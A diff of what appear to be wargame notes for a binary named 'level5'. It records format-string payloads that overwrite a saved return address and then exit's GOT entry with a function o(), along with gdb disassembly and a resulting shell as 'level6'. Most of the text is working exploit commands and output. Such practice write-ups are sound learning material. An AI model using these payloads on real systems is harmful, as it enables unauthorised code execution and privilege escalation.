@@ -32,3 +32,41 @@ bfff = 49151d
 python -c 'print "\x2c\xf7\xff\xbf" + "\x2d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n"'
 r < <(python -c 'print "\x4c\xf7\xff\xbf" + "\x4d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n" + "a"*10 + "%5$hn"')
 
+overwrite eip of n() function and launch sigtrap
+python -c 'print "\x2c\xf7\xff\xbf" + "\x2e\xf7\xff\xbf" + "\x90"*50 + "\xCC"*42 + "%49051x" + "%5$n" + "%13649x" + "%4$hn"'
+
+
+
+/***************************************/
+
+Overwrite GOT
+Replace exit plt function table by o() function
+
+080484a4 g     F .text	0000001e              o
+84a4 = 33956
+0804 = 2052 
+
+
+-> Get plt addres of exit:
+0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+-> disas 0x80483d0
+Dump of assembler code for function exit@plt:
+0x080483d0 <+0>:	jmp    *0x8049838
+0x080483d6 <+6>:	push   $0x28
+0x080483db <+11>:	jmp    0x8048370
+
+-> show address in GOT
+0x8049838 <exit@got.plt>:	0x00000004
+
+-> overwrite the entry
+r < <(python -c 'print "\x38\x98\x04\x08" + "%33952x" + "%4$hn"')
+
+(python -c 'print "\x38\x98\x04\x08" + "%33952x" + "%4$hn"'; cat) | ./level5
+
+whoami
+level6
+
+
+
+
